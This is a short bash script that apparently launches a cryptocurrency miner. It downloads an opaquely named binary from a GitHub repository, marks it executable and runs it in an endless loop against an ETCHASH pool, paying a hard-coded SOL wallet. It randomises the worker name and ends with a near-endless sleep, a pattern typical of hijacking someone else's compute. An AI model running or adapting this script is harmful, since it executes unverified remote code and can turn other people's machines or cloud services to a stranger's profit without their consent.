#!/bin/bash
POOL=etchash.unmineable.com:3333
WALLET=SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETCHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
